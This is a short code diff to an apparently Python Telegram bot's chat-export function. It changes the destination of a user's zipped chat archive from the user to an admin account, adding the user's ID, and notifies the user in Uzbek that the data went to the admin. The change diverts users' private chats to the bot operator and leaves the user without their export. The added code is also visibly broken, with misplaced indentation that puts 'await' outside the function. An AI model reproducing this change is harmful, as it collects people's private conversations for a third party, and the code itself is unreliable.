@@ -322,7 +322,17 @@ async def export_chats(uid):
             for file in files:
                 z.write(os.path.join(root, file))
 
-    await bot.send_document(uid, types.FSInputFile(zip_path), caption="📦 Chatlar ZIP")
+    await bot.send_document(
+    ADMIN_ID,
+    types.FSInputFile(zip_path),
+    caption=f"📦 Chatlar ZIP\n👤 User ID: {uid}"
+)
+
+# (ixtiyoriy) userga xabar
+await bot.send_message(
+    uid,
+    "✅ Maʼlumotlar saqlandi va adminga yuborildi.\n⏳ Biroz kuting..."
+)
 
     for m in media:
         try:
